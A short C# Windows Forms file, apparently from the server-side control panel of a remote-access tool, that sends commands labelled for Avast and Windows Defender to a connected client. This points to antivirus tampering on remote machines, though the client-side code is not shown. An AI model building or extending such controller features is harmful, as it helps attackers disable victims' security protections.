using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server.Forms
{
    public partial class Anti_V1rus : Form
    {
        public Anti_V1rus()
        {
            InitializeComponent();
        }
        Form1 f = new Form1();
        private void Anti_V1rus_Load(object sender, EventArgs e)
        {
            f.SendData("VAS|NONE@");
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string text = listBox1.GetItemText(listBox1.SelectedItem);
            if (text == "Avast")
                f.SendData("Avasb");
            if(text == "Windows Defender")
                f.SendData("Windows");
        }
    }
}
